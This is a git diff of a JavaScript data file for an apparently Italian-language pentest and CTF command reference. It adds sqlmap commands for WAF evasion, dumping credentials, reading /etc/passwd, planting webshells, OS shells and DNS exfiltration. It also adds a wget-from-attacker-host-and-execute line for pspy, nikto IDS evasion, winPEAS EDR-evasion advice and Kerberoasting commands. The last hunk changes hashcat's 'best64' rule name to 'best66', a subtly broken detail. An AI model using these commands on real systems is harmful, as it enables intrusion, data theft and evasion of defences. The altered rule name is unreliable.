+    "description": "Come puntare sqlmap sul bersaglio e fargli trovare il punto iniettabile. La fonte più affidabile è una richiesta salvata da Burp, che conserva header, cookie, metodo e corpo POST esattamente come li invia l’applicazione. Confermata l’injection e il DBMS, si passa all’enumerazione.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -9258,9 +9823,133 @@ const COMMANDS = [
     ],
     "tags": [
       "sqlmap",
-      "sqli"
+      "sqli",
+      "detection"
     ],
     "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch --dbs",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Detection + DB",
+        "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch --dbs",
+        "description": "Rileva l’injection sul parametro in query string e, appena confermata, elenca i database. `--batch` accetta ogni scelta di default senza fermarsi a chiedere."
+      },
+      {
+        "id": "request",
+        "label": "Da request Burp",
+        "template": "sqlmap -r request.txt --batch --dbs",
+        "description": "Carica una richiesta salvata da Burp o ZAP e testa ogni parametro al suo interno, conservando header, cookie, metodo e corpo POST. È il modo più affidabile sugli endpoint autenticati o complessi."
+      },
+      {
+        "id": "post",
+        "label": "POST / form",
+        "template": "sqlmap -u \"http://<ip>/login\" --data=\"username=admin&password=x\" --batch --dbs",
+        "description": "Testa i parametri inviati nel corpo POST, pratico sui form di login quando non vuoi passare da un file di richiesta."
+      },
+      {
+        "id": "crawl",
+        "label": "Crawl + form",
+        "template": "sqlmap -u \"http://<ip>/\" --crawl=2 --forms --batch --dbs",
+        "description": "Percorre il sito fino a profondità due e testa i form che incontra, utile quando non hai ancora un parametro preciso da cui partire."
+      }
+    ],
+    "refs": [
+      {
+        "label": "sqlmap — Usage wiki",
+        "url": "https://github.com/sqlmapproject/sqlmap/wiki/Usage"
+      },
+      {
+        "label": "HackTricks — sqlmap",
+        "url": "https://book.hacktricks.wiki/en/pentesting-web/sql-injection/sqlmap.html"
+      }
+    ],
+    "note": "# Da dove partire\nIl modo più affidabile è `-r request.txt`, una richiesta salvata da Burp: conserva metodo, header, cookie e corpo, così sqlmap testa esattamente ciò che vede l’applicazione. Con `-u` parti da un singolo URL in query string. Il punto di injection si marca a mano con un asterisco dove l’automatismo non arriva, ad esempio in un path REST `/api/user/1*`, in un header o in un valore JSON.\n# Allargare o restringere\n`-p id` limita i test al singolo parametro ed è molto più veloce che provarli tutti. `--forms` testa i form della pagina, `--crawl=2` raccoglie prima gli URL da visitare e `--mine-params` cerca parametri nascosti non collegati. Per affinare detection e tecnica, o per aggirare un WAF, vedi il comando sqlmap tuning e WAF.\n# Errori comuni\nSe sqlmap si ferma subito con `Connection refused` nella fase \"testing connection to the target URL\" ma il sito risponde in HTTPS, quasi sempre sta provando in chiaro sulla porta 80. Capita quando l’URL inizia con `http://` oppure quando usi `-r request.txt`, perché la richiesta grezza non indica il protocollo. La soluzione è `--force-ssl`, lasciando la porta `:443` nell’URL."
+  },
+  {
+    "id": "sqlmap-tuning",
+    "name": "sqlmap — tuning e WAF",
+    "category": "vuln-analysis",
+    "subcategory": "web-app-testing",
+    "group": "SQL Injection",
+    "description": "Quando la detection di default non trova nulla o un WAF rompe i test: si alza la copertura, si forza il motore e la tecnica, si riscrivono i payload per passare i filtri. Un 403 improvviso o risposte incoerenti sono il segnale che serve il tamper.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "sqlmap",
+      "sqli",
+      "waf",
+      "tamper"
+    ],
+    "template": "sqlmap -u \"http://<ip>/page?id=1\" -p id --level 5 --risk 3 --batch",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Livelli",
+        "template": "sqlmap -u \"http://<ip>/page?id=1\" -p id --level 5 --risk 3 --batch",
+        "description": "Porta copertura e aggressività al massimo: molti più payload, inclusi quelli su header e cookie, al prezzo di molte più richieste. `-p id` concentra tutto sul singolo parametro."
+      },
+      {
+        "id": "dbms",
+        "label": "Forza DBMS + tecnica",
+        "template": "sqlmap -u \"http://<ip>/page?id=1\" --dbms=mysql --technique=BEU --batch --dbs",
+        "description": "Quando il motore è già noto, `--dbms` salta il fingerprint e `--technique` limita le tecniche provate, qui boolean, error e union. La scansione diventa molto più rapida e silenziosa."
+      },
+      {
+        "id": "waf",
+        "label": "Evasione WAF",
+        "template": "sqlmap -u \"http://<ip>/page?id=1\" --random-agent --tamper=space2comment,between,randomcase --delay 1 --batch --dbs",
+        "description": "Combina uno User-Agent casuale, script di tamper che riscrivono i payload e un ritardo tra le richieste per passare il WAF."
+      }
+    ],
+    "refs": [
+      {
+        "label": "HackTricks — sqlmap",
+        "url": "https://book.hacktricks.wiki/en/pentesting-web/sql-injection/sqlmap.html"
+      }
+    ],
+    "note": "# Fingerprint e tecniche\n`--dbms=mysql` salta il riconoscimento quando il motore è già noto. `--technique` sceglie le tecniche con le lettere `B` boolean, `E` error, `U` union, `S` stacked, `T` time, `Q` inline query: su reti lente conviene togliere la time-based, che è la più lenta. `--time-sec` ne regola il ritardo e `--union-cols` fissa il numero di colonne della union.\n# Evasione WAF\nProva `--random-agent`, un `--delay` tra le richieste e soprattutto gli script `--tamper`: `space2comment` e `between` sono passe-partout, `charencode` e `charunicodeencode` lavorano sull’encoding, `modsecurityversioned` colpisce ModSecurity. `--list-tampers` mostra l’elenco completo, mentre `--chunked` e `--hpp` offuscano la richiesta spezzandola o duplicando i parametri."
+  },
+  {
+    "id": "sqlmap-enum",
+    "name": "sqlmap — enumerazione e dump",
+    "category": "vuln-analysis",
+    "subcategory": "web-app-testing",
+    "group": "SQL Injection",
+    "description": "Confermata l’injection, si scende nei dati: dai database alle tabelle, alle colonne, fino al dump. La caccia per nome di colonna trova credenziali e flag senza sapere in anticipo dove stanno.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "sqlmap",
+      "sqli",
+      "dump"
+    ],
+    "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch -D <db> --tables",
     "params": [
       {
         "key": "ip",
@@ -9277,38 +9966,43 @@ const COMMANDS = [
         "key": "table",
         "label": "Table",
         "placeholder": "users"
+      },
+      {
+        "key": "col",
+        "label": "Columns",
+        "placeholder": "user,password"
       }
     ],
     "variants": [
       {
         "id": "default",
-        "label": "Enum DB",
-        "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch --dbs",
-        "description": "Elenca i database."
-      },
-      {
-        "id": "tables",
         "label": "Tabelle",
         "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch -D <db> --tables",
-        "description": "Tabelle del database scelto."
+        "description": "Elenca le tabelle del database scelto, il passo naturale dopo la scoperta dei database."
+      },
+      {
+        "id": "columns",
+        "label": "Colonne",
+        "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch -D <db> -T <table> --columns",
+        "description": "Mostra le colonne di una tabella con il loro tipo, così scegli cosa estrarre senza scaricare tutto."
       },
       {
         "id": "dump",
-        "label": "Dump",
-        "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch -D <db> -T <table> --dump",
-        "description": "Estrae i dati della tabella."
+        "label": "Dump tabella",
+        "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch -D <db> -T <table> -C <col> --dump",
+        "description": "Estrae le colonne indicate. Senza `-C` scarica tutta la tabella; gli hash riconosciuti vengono proposti per il cracking a dizionario."
       },
       {
-        "id": "osshell",
-        "label": "OS shell",
-        "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch --os-shell",
-        "description": "Tenta una shell sul DBMS (serve privilegio FILE o stacked queries)."
+        "id": "dumpall",
+        "label": "Dump completo",
+        "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch --dump-all --exclude-sysdbs",
+        "description": "Scarica in un colpo tutti i database applicativi, escludendo quelli di sistema. Comodo in CTF quando la flag può essere ovunque."
       },
       {
-        "id": "burp",
-        "label": "Da request Burp",
-        "template": "sqlmap -r request.txt --batch --dbs",
-        "description": "Usa una request salvata: gestisce header, cookie e POST automaticamente."
+        "id": "search",
+        "label": "Caccia colonne",
+        "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch --search -C pass,user,flag,token",
+        "description": "Cerca in tutti i database le colonne il cui nome contiene le parole chiave, scorciatoia preziosa per credenziali e flag."
       }
     ],
     "refs": [
@@ -9317,7 +10011,92 @@ const COMMANDS = [
         "url": "https://book.hacktricks.wiki/en/pentesting-web/sql-injection/sqlmap.html"
       }
     ],
-    "note": "# Scegliere il parametro da iniettare\n- `-p <param>` testa solo quel parametro, più veloce che provarli tutti (per esempio `-p id`)\n- `*` marca a mano il punto di injection dove serve, che sia un path REST, un header o un valore JSON: per esempio `/api/user/1*` oppure `id=1*` in una request salvata con `-r`\n# Opzioni utili\n- `--level 5 --risk 3` allargano i test: più payload, ma più lenti\n- `--random-agent` e un `--tamper` adatto aiutano contro WAF e filtri\n- `-D <db> -T <table> -C <col> --dump` scende fino ai dati\n# Errori comuni\nUn 403 o risposte incoerenti indicano spesso un WAF: prova `--random-agent`, un `--tamper` adatto e un `--delay`. Senza un punto di injection valido sqlmap non trova nulla: parti da `-r request.txt` così rispetta header, cookie e sessione.\n# Errori comuni\nSe sqlmap si ferma subito con `Connection refused` già alla fase **\"testing connection to the target URL\"**, e il sito in realtà risponde in HTTPS, quasi sempre il motivo è questo: sqlmap sta provando a connettersi **in chiaro sulla porta 80** invece che in HTTPS sulla **443**.\n\nSuccede tipicamente in due casi:\n1. Hai usato un URL che inizia con `http://`.\n2. Stai passando una request salvata da Burp con `-r request.txt`: la request grezza non indica se l'originale era HTTP o HTTPS, quindi sqlmap non lo sa e prova in chiaro.\n\nLa soluzione è di aggiungere `--force-ssl`, che obbliga sqlmap a usare TLS su tutte le richieste. Assicurati anche di lasciare la porta `:443` nell'URL."
+    "note": "# Enumerazione\nLa progressione naturale è `--dbs`, poi `-D <db> --tables`, `-D <db> -T <t> --columns` e infine `--dump`. `--search -C pass,user` cerca le colonne per nome in tutti i database, `--dump-all --exclude-sysdbs` scarica l’intero applicativo e `--where` filtra le righe di una tabella.\n# Errori comuni\nSe i dati estratti compaiono con un punto interrogativo, aggiungi `--hex` per forzare la conversione esadecimale durante il recupero. Per i privilegi della connessione e il salto al sistema vedi il comando sqlmap privilegi, file e shell."
+  },
+  {
+    "id": "sqlmap-rce",
+    "name": "sqlmap — privilegi, file e shell",
+    "category": "vuln-analysis",
+    "subcategory": "web-app-testing",
+    "group": "SQL Injection",
+    "description": "Dal database al sistema operativo: prima si misurano i privilegi della connessione, poi si tenta la lettura o scrittura di file e la shell. Richiede privilegi da DBA e, secondo il motore, stacked queries o la scrittura nella web root.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "sqlmap",
+      "sqli",
+      "rce"
+    ],
+    "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch --current-user --current-db --is-dba --passwords",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "user",
+        "label": "Utente",
+        "ctx": "user",
+        "placeholder": "root"
+      },
+      {
+        "key": "password",
+        "label": "Password",
+        "ctx": "password",
+        "placeholder": "••••••"
+      },
+      {
+        "key": "db",
+        "label": "Database",
+        "placeholder": "app"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Utente, DBA, hash",
+        "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch --current-user --current-db --is-dba --passwords",
+        "description": "Fotografa i privilegi della connessione: utente corrente, database in uso, se è un DBA e gli hash degli account del DBMS. Decide se puoi puntare a file e shell."
+      },
+      {
+        "id": "fileread",
+        "label": "Lettura / scrittura file",
+        "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch --file-read=/etc/passwd",
+        "description": "Legge un file dal filesystem del DBMS. Con `--file-write` e `--file-dest` carica invece un file locale sul server, ad esempio una webshell nella directory pubblica."
+      },
+      {
+        "id": "osshell",
+        "label": "OS shell",
+        "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch --os-shell",
+        "description": "Tenta una shell di sistema sul server del database. Richiede privilegi da DBA e, secondo il motore, stacked queries o il permesso di scrivere nella web root."
+      },
+      {
+        "id": "sqlshell",
+        "label": "SQL shell",
+        "template": "sqlmap -u \"http://<ip>/page?id=1\" --batch --sql-shell",
+        "description": "Apre una shell SQL interattiva che esegue query arbitrarie attraverso l’injection. Per una sola query usa `--sql-query=\"SELECT ...\"`."
+      },
+      {
+        "id": "direct",
+        "label": "Connessione diretta",
+        "template": "sqlmap -d \"mysql://<user>:<password>@<ip>:3306/<db>\" --os-shell",
+        "description": "Si collega direttamente al database con credenziali già note, saltando del tutto il web, per puntare subito a file o shell."
+      }
+    ],
+    "refs": [
+      {
+        "label": "HackTricks — sqlmap",
+        "url": "https://book.hacktricks.wiki/en/pentesting-web/sql-injection/sqlmap.html"
+      }
+    ],
+    "note": "# Dal database al sistema\n`--os-shell` tenta la shell di sistema, `--os-cmd` esegue un singolo comando, `--os-pwn` punta a una shell OOB o a Meterpreter. Servono privilegi da DBA e, secondo il motore, stacked queries o scrittura nella web root. `--file-read` legge file, `--file-write` con `--file-dest` ne carica uno, `--sql-shell` apre una shell SQL interattiva e `--priv-esc` tenta l’escalation del processo del database.\n# OOB e second-order\n`--dns-domain=interactsh` esfiltra i dati via DNS senza alcun setup, prezioso quando non c’è un canale di output diretto. Nelle injection di secondo ordine, dove l’effetto compare su un’altra pagina, `--second-req` carica la richiesta che ne mostra il risultato."
   },
   {
     "id": "xss-detect",
@@ -10949,12 +11728,11 @@ const COMMANDS = [
   },
   {
     "id": "nuclei",
-    "name": "nuclei — scanner a template",
+    "name": "nuclei — scansione",
     "category": "vuln-analysis",
     "subcategory": "infrastructure",
     "group": "Scanners",
-    "description": "Scanner basato su template per CVE e misconfiguration note.\n- `-tags cve` = limita ai template dei CVE\n- `-o` = salva sempre l'output su file",
-    "note": "# Quale variante usare\nAggiorna i template (nuclei -ut) prima di lanciarlo. -tags cve oppure -severity high,critical riducono rumore e falsi positivi. Dagli in pasto la lista di host viva da httpx. Conferma sempre a mano ogni finding prima di dichiararlo valido.",
+    "description": "Scanner a template: confronta il target con migliaia di firme della community per CVE noti, misconfigurazioni, pannelli esposti e credenziali di default. Rende al meglio sulla lista di host già validi prodotta da httpx, non sull’intero intervallo.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -10981,15 +11759,96 @@ const COMMANDS = [
         "id": "default",
         "label": "Full",
         "template": "nuclei -u http://<ip> -o nuclei.txt",
-        "description": "Tutti i template applicabili."
+        "description": "Esegue tutti i template applicabili e salva il risultato su file."
       },
       {
-        "id": "cve",
+        "id": "list",
+        "label": "Su lista host",
+        "template": "nuclei -l hosts.txt -o nuclei.txt",
+        "description": "Scansiona una lista di host, tipicamente l’output di httpx. Molto più rapido e pulito che puntare a tutto l’intervallo."
+      },
+      {
+        "id": "severity",
+        "label": "Solo high/critical",
+        "template": "nuclei -u http://<ip> -severity high,critical -o nuclei.txt",
+        "description": "Taglia l’informativo e il rumore, lasciando solo i problemi che contano."
+      },
+      {
+        "id": "auto",
+        "label": "Scan automatico",
+        "template": "nuclei -u http://<ip> -as -o nuclei.txt",
+        "description": "Riconosce prima le tecnologie in stile Wappalyzer e lancia solo i template pertinenti, riducendo richieste inutili."
+      }
+    ],
+    "refs": [
+      {
+        "label": "nuclei — documentazione",
+        "url": "https://docs.projectdiscovery.io/tools/nuclei/overview"
+      }
+    ],
+    "note": "# Prima di lanciarlo\nAggiorna i template con `-ut`, altrimenti ti perdi i CVE recenti. Punta `nuclei` sulla lista di host già validi, cioè l’output di `httpx` o `dnsx`, non sull’intero intervallo: è più veloce e meno rumoroso.\n# Ridurre il rumore\n`-severity high,critical` elimina l’informativo e i falsi positivi, `-as` lancia solo i template pertinenti alle tecnologie rilevate, `-rl` limita le richieste al secondo sugli ambienti fragili. Per i template mirati e il fuzzing vedi il comando nuclei mirato e fuzzing."
+  },
+  {
+    "id": "nuclei-targeted",
+    "name": "nuclei — mirato e fuzzing",
+    "category": "vuln-analysis",
+    "subcategory": "infrastructure",
+    "group": "Scanners",
+    "description": "Quando sai cosa cercare o vuoi andare oltre i controlli statici: solo i CVE, un singolo template per ID, oppure il fuzzing DAST che inietta sui parametri per scovare SQLi, XSS e SSTI. Conferma sempre a mano ogni finding.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "nuclei",
+      "cve",
+      "dast"
+    ],
+    "template": "nuclei -u http://<ip> -tags cve -o nuclei_cve.txt",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
         "label": "Solo CVE",
         "template": "nuclei -u http://<ip> -tags cve -o nuclei_cve.txt",
-        "description": "Limita ai template taggati cve."
+        "description": "Limita ai template taggati cve, utile quando cerchi una vulnerabilità nota su una versione già individuata."
+      },
+      {
+        "id": "id",
+        "label": "Template singolo",
+        "template": "nuclei -u http://<ip> -id CVE-2024-XXXXX -o nuclei.txt",
+        "description": "Esegue un solo template per ID, quando sai già quale CVE verificare."
+      },
+      {
+        "id": "dast",
+        "label": "Fuzzing (DAST)",
+        "template": "nuclei -u \"http://<ip>/?id=1\" -dast -o nuclei_dast.txt",
+        "description": "Abilita i template di fuzzing che iniettano sui parametri della richiesta, per SQLi, XSS e SSTI oltre ai CVE statici."
+      },
+      {
+        "id": "update",
+        "label": "Aggiorna template",
+        "template": "nuclei -ut",
+        "description": "Aggiorna il catalogo dei template all’ultima release, da lanciare prima di ogni sessione."
       }
-    ]
+    ],
+    "refs": [
+      {
+        "label": "nuclei — documentazione",
+        "url": "https://docs.projectdiscovery.io/tools/nuclei/overview"
+      }
+    ],
+    "note": "# Template mirati\n`-tags cve` restringe ai CVE, `-id CVE-...` esegue un singolo template quando sai già cosa cercare. Aggiorna sempre con `-ut` prima di affidarti ai risultati.\n# Fuzzing DAST\n`-dast` attiva i template che iniettano sui parametri e trovano SQLi, XSS e SSTI che i controlli statici non vedono. `-fuzz-aggression` ne alza l’intensità e `-cs` tiene il fuzzer dentro lo scope.\n# Attenzione\nConferma sempre a mano ogni finding prima di dichiararlo valido: un template può colpire nel contesto sbagliato."
   },
   {
     "id": "nikto",
@@ -10997,8 +11856,7 @@ const COMMANDS = [
     "category": "vuln-analysis",
     "subcategory": "infrastructure",
     "group": "Scanners",
-    "description": "Scanner web veloce per file pericolosi, header e misconfiguration. È rumoroso, quindi adatto solo quando lo stealth non conta.",
-    "note": "# Attenzione\nMolto rumoroso e pieno di falsi positivi: adatto solo quando lo stealth non conta (lab, CTF, scope esplicito). Buono per header mancanti, file di default e versioni vecchie, ma ogni risultato va verificato a mano. Per un web scan più mirato preferisci nuclei.",
+    "description": "Scanner web veloce per file pericolosi, header mancanti, metodi abilitati e misconfigurazioni di default. È **rumoroso** e pieno di risultati da verificare, quindi adatto solo quando lo stealth non conta, come in laboratorio, in CTF o entro uno scope esplicito.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -11018,7 +11876,46 @@ const COMMANDS = [
         "ctx": "ip",
         "placeholder": "10.10.10.11"
       }
-    ]
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Base",
+        "template": "nikto -h http://<ip> -o nikto.txt",
+        "description": "Scansione completa con tutti i plugin e salvataggio su file."
+      },
+      {
+        "id": "ssl",
+        "label": "HTTPS",
+        "template": "nikto -h <ip> -p 443 -ssl -o nikto.txt",
+        "description": "Forza il TLS sulla porta indicata, per i servizi esposti solo in HTTPS."
+      },
+      {
+        "id": "tuning",
+        "label": "Mirato (injection/RCE)",
+        "template": "nikto -h http://<ip> -Tuning 3489a -o nikto.txt",
+        "description": "Restringe ai controlli che contano in un attacco: information disclosure, injection, RCE, SQLi e bypass di autenticazione."
+      },
+      {
+        "id": "auth",
+        "label": "Con credenziali",
+        "template": "nikto -h http://<ip> -id user:pass -o nikto.txt",
+        "description": "Scansiona dietro un’autenticazione Basic, nel formato utente e password separati dai due punti."
+      },
+      {
+        "id": "evasion",
+        "label": "Evasione + user-agent",
+        "template": "nikto -h http://<ip> -evasion 1 -useragent \"Mozilla/5.0\" -o nikto.txt",
+        "description": "Applica una tecnica di evasione degli IDS e cambia lo User-Agent per non farsi marcare subito come scanner."
+      }
+    ],
+    "refs": [
+      {
+        "label": "nikto — wiki",
+        "url": "https://github.com/sullo/nikto/wiki"
+      }
+    ],
+    "note": "# Quando usarlo\nBuono per header mancanti, file di default, metodi HTTP pericolosi e versioni vecchie, ma ogni risultato va verificato a mano. Per un web scan più mirato e con meno falsi positivi preferisci `nuclei`.\n# Tuning\n`-Tuning` sceglie le categorie di test: `1` file interessanti, `2` misconfig, `3` information disclosure, `4` injection, `8` RCE, `9` SQLi, `a` bypass auth, `b` identificazione software. Combinare solo quelle offensive accorcia molto la scansione."
   },
   {
     "id": "sa-linux-who",
@@ -13068,6 +13965,61 @@ const COMMANDS = [
     ]
   },
   {
+    "id": "pspy",
+    "name": "pspy — spia processi e cron",
+    "category": "privesc-linux",
+    "subcategory": "cron-tasks",
+    "group": "Process monitoring",
+    "description": "Mostra in tempo reale ogni processo che nasce sul sistema, inclusi i cron job e i comandi lanciati da altri utenti, **senza bisogno di root**. È lo strumento che rivela l’attività periodica invisibile leggendo solo i file di cron: uno script eseguito da root a intervalli regolari è spesso proprio lì il vettore di privilege escalation.",
+    "platform": "linux",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [],
+    "tags": [
+      "pspy",
+      "cron",
+      "privesc",
+      "monitoring"
+    ],
+    "template": "./pspy64",
+    "params": [
+      {
+        "key": "lhost",
+        "label": "LHOST (tu)",
+        "ctx": "lhost",
+        "placeholder": "10.10.14.5"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Esegui sul target",
+        "template": "./pspy64",
+        "description": "Avvia pspy e stampa ogni nuovo processo con il comando completo, l’UID e il PID. Lascialo girare qualche minuto per catturare i job periodici."
+      },
+      {
+        "id": "verbose",
+        "label": "Processi + file",
+        "template": "./pspy64 -pf -i 1000",
+        "description": "Aggiunge gli eventi sul filesystem e campiona ogni secondo, utile per vedere quali file tocca un cron job appena prima di eseguirlo."
+      },
+      {
+        "id": "fetch",
+        "label": "Scarica e avvia",
+        "template": "wget http://<lhost>:8000/pspy64 -O /tmp/p && chmod +x /tmp/p && /tmp/p",
+        "description": "Trasferisce pspy sul target da un tuo server HTTP e lo avvia. Sui sistemi a 32 bit usa `pspy32`."
+      }
+    ],
+    "refs": [
+      {
+        "label": "pspy — GitHub",
+        "url": "https://github.com/DominicBreuker/pspy"
+      }
+    ],
+    "note": "# Perché pspy\nNon richiede privilegi e non si limita a leggere i file di cron: intercetta davvero ogni processo che parte, quindi cattura i cron job di root, gli script di manutenzione e i task schedulati che girano a intervalli. Lascialo in esecuzione per qualche minuto, idealmente a cavallo del minuto tondo, per non perdere i job al minuto.\n# Cosa cercare\nUn processo lanciato da root, cioè UID 0, che esegue uno script o un binario su cui hai permesso di scrittura è la via diretta alla privilege escalation. Annota UID, PID e percorso completo del comando, poi incrocia con i permessi del file.\n# Prossimo passo\nSe il job root tocca uno script scrivibile, inietta un comando come in [[cron-discover]]. Se usa una wildcard o un PATH relativo, sfrutta quella invece del contenuto dello script."
+  },
+  {
     "id": "kernel-linux",
     "name": "Kernel exploit — Linux",
     "category": "privesc-linux",
@@ -13180,12 +14132,11 @@ const COMMANDS = [
   },
   {
     "id": "winpeas",
-    "name": "WinPEAS — enum privesc",
+    "name": "winPEAS — enum automatica",
     "category": "privesc-windows",
     "subcategory": "auto-enum",
     "group": "Scanner",
-    "description": "Enumerazione automatica per Windows, equivalente di LinPEAS: setaccia servizi, permessi deboli, credenziali salvate, privilegi del token e AlwaysInstallElevated, evidenziando in rosso i vettori più promettenti. Su un target con EDR attivo il binario viene spesso segnalato, e conviene ripiegare su Seatbelt o sui comandi manuali.",
-    "note": "# Cosa osservare\nEvidenzia in rosso i vettori probabili: privilegi del token, servizi mal configurati, credenziali salvate, AlwaysInstallElevated. Esegui la build giusta (x64/x86) e conferma a mano.",
+    "description": "Enumerazione automatica per Windows, l’equivalente di LinPEAS: setaccia servizi, permessi deboli, credenziali salvate, privilegi del token e AlwaysInstallElevated, evidenziando in rosso i vettori più promettenti. Su un target con EDR attivo il binario .NET viene spesso segnalato, e allora conviene ripiegare sulla versione `.bat`, su Seatbelt o sui comandi manuali.",
     "platform": "windows",
     "requires": [
       "shell"
@@ -13193,11 +14144,42 @@ const COMMANDS = [
     "protocols": [],
     "tags": [
       "winpeas",
-      "peass",
+      "privesc",
       "enum"
     ],
     "template": ".\\winpeas.exe",
-    "params": []
+    "params": [],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Eseguibile",
+        "template": ".\\winpeas.exe",
+        "description": "Esegui dopo aver trasferito il binario. Scegli la build giusta, `winPEASx64.exe` o `winPEASx86.exe`, in base all’architettura del processo."
+      },
+      {
+        "id": "bat",
+        "label": "Versione .bat (EDR)",
+        "template": "winpeas.bat",
+        "description": "La versione batch non carica assembly .NET e spesso passa dove l’eseguibile viene bloccato dall’EDR, al prezzo di qualche controllo in meno."
+      },
+      {
+        "id": "log",
+        "label": "Salva su file",
+        "template": ".\\winpeas.exe log",
+        "description": "Scrive l’output su file mantenendo i colori ANSI, che si rileggono bene con `cat` dopo averlo portato su Linux."
+      }
+    ],
+    "refs": [
+      {
+        "label": "WinPEAS — PEASS-ng",
+        "url": "https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS"
+      },
+      {
+        "label": "HackTricks — Windows local privesc",
+        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
+      }
+    ],
+    "note": "# Cosa osservare\nEvidenzia in rosso i vettori più probabili: privilegi del token, servizi mal configurati, credenziali salvate e AlwaysInstallElevated. WinPEAS segnala, non sfrutta: esegui la build giusta e conferma sempre a mano prima di procedere.\n# Se l’EDR blocca\nIl binario .NET è firma nota per molti antivirus. Ripiega sulla versione `.bat`, su [[seatbelt]] che è più discreto, o sui controlli manuali di [[whoami-priv]] e dei servizi."
   },
   {
     "id": "seatbelt",
@@ -16024,7 +17006,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "initial-access",
     "group": "Kerberoasting",
-    "description": "Kerberoasting: richiede i TGS di tutti gli account con un SPN registrato, che qualsiasi utente autenticato può ottenere. Gli account di servizio hanno spesso password deboli e mai scadute, quindi l'hash risultante, craccabile offline con hashcat in mode 13100, cade con frequenza sorprendente. Richiede una qualsiasi credenziale di dominio valida.",
+    "description": "Kerberoasting: richiede i TGS di tutti gli account con un SPN registrato, che qualsiasi utente autenticato può ottenere. Gli account di servizio hanno spesso password deboli e mai scadute, quindi l’hash risultante, craccabile offline con hashcat in mode 13100, cade con frequenza sorprendente. Richiede una qualsiasi credenziale di dominio valida.",
     "note": "# Prerequisiti\nServe un account di dominio valido. Richiede i TGS degli account con SPN (di servizio, password spesso deboli e vecchie): hash 13100 di hashcat. Se l’account è ad alto privilegio, è una scorciatoia verso DA.",
     "platform": "linux",
     "requires": [
@@ -16062,6 +17044,37 @@ const COMMANDS = [
         "label": "DC IP",
         "ctx": "ip",
         "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "hash",
+        "label": "Hash",
+        "ctx": "hash",
+        "placeholder": "aad3b…"
+      },
+      {
+        "key": "spnuser",
+        "label": "Utente SPN",
+        "placeholder": "svc_sql"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Con password",
+        "template": "impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <ip> -request -outputfile kerb.txt",
+        "description": "Richiede i ticket di servizio di tutti gli account con SPN e salva gli hash per il cracking offline."
+      },
+      {
+        "id": "hash",
+        "label": "NTLM hash",
+        "template": "impacket-GetUserSPNs <domain>/<user> -hashes :<hash> -dc-ip <ip> -request -outputfile kerb.txt",
+        "description": "Stesso roasting ma autenticandosi con l’hash NTLM invece della password, dopo un Pass-the-Hash nel dominio."
+      },
+      {
+        "id": "target",
+        "label": "Utente mirato",
+        "template": "impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <ip> -request-user <spnuser> -outputfile kerb.txt",
+        "description": "Chiede il ticket di un solo account ad alto valore, ad esempio un service account amministrativo, invece di tutti."
       }
     ]
   },
@@ -19691,7 +20704,7 @@ const COMMANDS = [
     "subcategory": "cheatsheets",
     "group": "Cracking",
     "description": "Mode hashcat ricorrenti in un pentest:\n- `0` MD5 · `100` SHA1 · `1000` NTLM\n- `1800` sha512crypt (`$6$`, /etc/shadow) · `3200` bcrypt\n- `5600` NetNTLMv2 (Responder) · `13100` Kerberoast (TGS) · `18200` AS-REP\n- `22000` WPA-PBKDF2",
-    "note": "# Quale variante usare\nIl mode sbagliato fa fallire il crack in silenzio. Ricorrenti in AD: 1000 NTLM, 5600 NetNTLMv2 (Responder), 13100 Kerberoast (TGS), 18200 ASREPRoast; per /etc/shadow 1800 ($6$). Abbinaci una buona wordlist (rockyou) e le regole (best64).",
+    "note": "# Quale variante usare\nIl mode sbagliato fa fallire il crack in silenzio. Ricorrenti in AD: 1000 NTLM, 5600 NetNTLMv2 (Responder), 13100 Kerberoast (TGS), 18200 ASREPRoast; per /etc/shadow 1800 ($6$). Abbinaci una buona wordlist (rockyou) e le regole (best66).",
